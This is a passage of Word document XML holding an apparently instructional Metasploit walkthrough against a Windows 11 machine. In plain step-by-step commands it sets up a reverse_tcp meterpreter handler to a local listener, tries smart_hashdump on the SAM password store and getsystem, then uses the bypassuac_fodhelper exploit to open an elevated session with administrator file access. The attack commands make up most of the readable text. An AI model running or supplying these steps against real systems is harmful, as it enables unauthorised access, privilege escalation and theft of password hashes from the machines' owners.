          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">AFTER COMPLETING THE METERPRETER SESSION AS WE HAVE SEEN BEFORE THAT WE CAN GET ACCESS TO THE IMPORTANT FILES BY GOING TO “SHELL” WHICH LEADS TO THE DEVICE TERMINAL . NOW WE NEED TO PERFORM PRIVILEGE ESCALATION SO WE CAN GET MORE INFORMATION ABOUT THE USERS ACCOUNTS, PASSWORDS(HASHED VALUE),GETTING ACCESS TO THE SAM FILE AND ALSO BYPASSING THE USERS ACCESS CONTROL SETTINGS IN THE WINDOWS SYSTEM.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000160">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can run the command </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000161">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">run  post/windows/gather/smart_hashdump to gather the hashed value of the passwords saved in SAM file in windows 11 machine…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000162">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000163">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">For that we will be following the previous methods to create the meterpreter session…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000164">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000165">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82" name="image91.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image91.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId6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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">SEARCH exploit/multi/handler</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000167">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Use 4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000168">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Set payload windows/meterpreter/reverse_tcp</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000169">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Show options</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">set LHOST 192.168.29.100</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">set LPORT 4444</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Exploit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016D">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36"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40"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65"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">WE CAN CLEARLY SEE THAT IT CAN NOT GATHER THE PASSWORDS FROM SAM FILE as it shows”insufficient privileges”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000171">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000172">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW WE WILL TRY THE COMMAND getsystem -t 1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000173">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000174">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32"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Again it shows OPERATION FAILED::::</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000176">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000177">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">For that we need to use a different metasploit-framework tool named &gt;&gt;&gt;&gt;exploit/windows/local/bypassuac_fodhelper</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000178">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000179">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">FOR THAT TYPE “BACKGROUND”so we can get back to the search tool of metasploit-framework..</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017B">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95"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">So now we are on the search segment of our tool</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">So type exploit/windows/local/bypassuac_fodhelper</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000180">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88" name="image74.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image74.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId7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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now use 0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000182">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Then set payload windows/meterpreter/reverse_tcp</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000183">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Show options</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000184">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">set SESSION 1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000185">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Set target 0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000186">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Exploit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000187">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85" name="image79.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image79.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId73"/>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red"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="27"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">So we can see that now we have got a new meterpreter session [2] opened up..</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000189">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can type shell and dir and this time we have the files/folder as an administrator..</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
